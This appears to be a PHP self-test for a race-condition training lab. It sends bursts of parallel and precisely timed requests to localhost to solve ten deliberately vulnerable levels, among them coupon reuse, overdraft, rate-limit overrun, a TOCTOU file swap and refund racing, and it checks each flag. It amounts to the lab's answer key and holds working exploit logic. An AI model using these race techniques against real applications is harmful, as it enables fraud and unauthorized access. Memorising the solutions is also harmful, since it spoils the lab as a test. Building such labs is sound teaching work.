<?php
/**
 * Self-test: performs the intended race for every level against the live app.
 *
 *   docker compose exec web php /var/www/html/solve_check.php
 *
 * Races are probabilistic, so each level gets a few attempts before it is
 * called a failure. Every attempt resets the level's state first.
 */
require_once __DIR__ . '/helpers.php';
require_once __DIR__ . '/secrets.php';

$base = 'http://localhost';
$sid  = bin2hex(random_bytes(8));
$pass = 0;
$fail = 0;

/* ------------------------------------------------------------------ http */

function h(string $url, array $post = null)
{
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_COOKIE         => 'race_sid=' . $GLOBALS['sid'],
        CURLOPT_TIMEOUT        => 30,
    ]);
    if ($post !== null) {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post));
    }
    $r = curl_exec($ch);
    curl_close($ch);
    return (string)$r;
}

/** Fire the same request N times, genuinely in parallel. */
function burst(string $url, array $post, int $n, bool $warm = false): array
{
    $mh      = curl_multi_init();
    $handles = [];
    for ($i = 0; $i < $n; $i++) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_COOKIE         => 'race_sid=' . $GLOBALS['sid'],
            CURLOPT_POST           => true,
            CURLOPT_POSTFIELDS     => http_build_query($post),
            CURLOPT_TIMEOUT        => 30,
            CURLOPT_FORBID_REUSE   => false,
        ]);
        $handles[] = $ch;
    }

    $run = static function (array $handles, string $u) use ($mh) {
        foreach ($handles as $ch) {
            curl_setopt($ch, CURLOPT_URL, $u);
            curl_multi_add_handle($mh, $ch);
        }
        $active = null;
        do {
            curl_multi_exec($mh, $active);
            curl_multi_select($mh, 0.05);
        } while ($active > 0);
        $out = [];
        foreach ($handles as $ch) {
            $out[] = (string)curl_multi_getcontent($ch);
            curl_multi_remove_handle($mh, $ch);
        }
        return $out;
    };

    if ($warm) {
        $run($handles, $url . '&warm=1');       // pay the handshakes on these handles
    }
    $out = $run($handles, $url);

    foreach ($handles as $ch) {
        curl_close($ch);
    }
    curl_multi_close($mh);
    return $out;
}

/** Fire two different requests at the same moment. */
function pair(string $urlA, array $postA, string $urlB, array $postB): array
{
    $mh = curl_multi_init();
    $hs = [];
    foreach ([[$urlA, $postA], [$urlB, $postB]] as [$u, $p]) {
        $ch = curl_init($u);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_COOKIE         => 'race_sid=' . $GLOBALS['sid'],
            CURLOPT_POST           => true,
            CURLOPT_POSTFIELDS     => http_build_query($p),
            CURLOPT_TIMEOUT        => 30,
        ]);
        curl_multi_add_handle($mh, $ch);
        $hs[] = $ch;
    }
    $active = null;
    do {
        curl_multi_exec($mh, $active);
        curl_multi_select($mh, 0.05);
    } while ($active > 0);
    $out = [];
    foreach ($hs as $ch) {
        $out[] = (string)curl_multi_getcontent($ch);
        curl_multi_remove_handle($mh, $ch);
        curl_close($ch);
    }
    curl_multi_close($mh);
    return $out;
}

/** Start a request without waiting for it, so another can be sent mid-flight. */
function async_start(string $path, array $post)
{
    $body = http_build_query($post);
    $sock = @fsockopen('localhost', 80, $errno, $errstr, 5);
    if (!$sock) {
        return null;
    }
    fwrite($sock,
        "POST $path HTTP/1.1\r\nHost: localhost\r\n"
        . "Cookie: race_sid=" . $GLOBALS['sid'] . "\r\n"
        . "Content-Type: application/x-www-form-urlencoded\r\n"
        . 'Content-Length: ' . strlen($body) . "\r\nConnection: close\r\n\r\n" . $body);
    return $sock;
}

function async_finish($sock): string
{
    if (!$sock) {
        return '';
    }
    $r = stream_get_contents($sock);
    fclose($sock);
    return (string)$r;
}

function reset_level(int $l): void
{
    h($GLOBALS['base'] . "/level$l.php", ['_reset' => 1]);
}

function solved(int $l): bool
{
    return strpos(h($GLOBALS['base'] . "/level$l.php"), race_flag($l)) !== false;
}

/**
 * Try an attack a few times; races do not land every run.
 */
function attempt(int $level, callable $fn, int $tries = 6, string $note = ''): void
{
    global $pass, $fail;
    for ($i = 1; $i <= $tries; $i++) {
        reset_level($level);
        $fn();
        if (solved($level)) {
            $pass++;
            echo "  PASS  level $level  " . race_flag($level)
               . "  (attempt $i" . ($note !== '' ? ", $note" : '') . ")\n";
            return;
        }
    }
    $fail++;
    echo "  FAIL  level $level  (expected " . race_flag($level) . " after $tries attempts)\n";
}

echo "Race Condition Lab self-test\n----------------------------\n";

/* 1 - lost update */
attempt(1, fn() => burst("$base/api.php?level=1", ['level' => 1], 10, true), 6, 'burst of 10');

/* 2 - coupon reuse */
attempt(2, fn() => burst("$base/api.php?level=2", ['level' => 2], 6, true), 6, 'burst of 6');

/* 3 - overdraft */
attempt(3, fn() => burst("$base/api.php?level=3", ['level' => 3], 4, true), 6, 'burst of 4');

/* 4 - rate limit overrun */
attempt(4, fn() => burst("$base/api.php?level=4", ['level' => 4], 8, true), 6, 'burst of 8');

/* 5 - TOCTOU: start the export, swap the selection during its window */
attempt(5, function () use ($base) {
    $s = async_start('/api.php?level=5&op=export', ['level' => 5, 'op' => 'export']);
    usleep(60000);                                    // land inside the 160 ms window
    h("$base/api.php?level=5&op=select", ['level' => 5, 'op' => 'select', 'to' => 'vault.key']);
    async_finish($s);
    h("$base/level5.php", ['answer' => cl_race_secret()]);
}, 6, 'select at +60ms');

/* 6 - distinct session ids, so the session lock does not serialise them */
attempt(6, fn() => burst("$base/api.php?level=6", ['level' => 6, 'token' => ''], 6, true), 6, 'per-request sessions');

/* 7 - ship and cancel together */
attempt(7, fn() => pair(
    "$base/api.php?level=7&op=ship",   ['level' => 7, 'op' => 'ship'],
    "$base/api.php?level=7&op=cancel", ['level' => 7, 'op' => 'cancel']
), 8, 'ship + cancel');

/* 8 - warmed connections, one tight window */
attempt(8, fn() => burst("$base/api.php?level=8", ['level' => 8], 14, true), 8, 'warmed, 14 requests');

/* 9 - non-atomic compare-and-swap */
attempt(9, fn() => burst("$base/api.php?level=9", ['level' => 9], 6, true), 8, 'burst of 6');

/* 10 - alternate the two windows */
attempt(10, function () use ($base) {
    h("$base/api.php?level=10&op=buy", ['level' => 10, 'op' => 'buy']);   // one credit, paid for
    burst("$base/api.php?level=10&op=refund", ['level' => 10, 'op' => 'refund'], 6, true);
}, 6, 'buy once, then race the refunds');

echo "----------------------------\n$pass passed, $fail failed\n";
exit($fail === 0 ? 0 : 1);
